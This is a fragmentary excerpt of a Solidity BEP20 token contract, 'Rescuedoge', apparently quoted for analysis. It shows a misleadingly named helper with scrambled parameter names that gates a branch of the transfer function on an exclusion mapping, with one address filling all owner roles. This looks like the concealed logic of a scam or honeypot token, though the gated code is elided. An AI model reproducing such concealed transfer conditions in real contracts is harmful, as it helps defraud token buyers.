...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _balances_(address wdsawdwd, address rfaecpien) internal view returns (bool){
        return (wdsawdwd != rfaecpien) || (isExcludedFromCut[wdsawdwd] == false || false);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(_balances_(sender,recipient))
...
contract Rescuedoge is BEP20 {
    constructor() BEP20(
        ...
        [0x7ED1F96bCBea382e155835fa39Fc50e922b93550,0x7ED1F96bCBea382e155835fa39Fc50e922b93550],
        0x7ED1F96bCBea382e155835fa39Fc50e922b93550
    ){}
}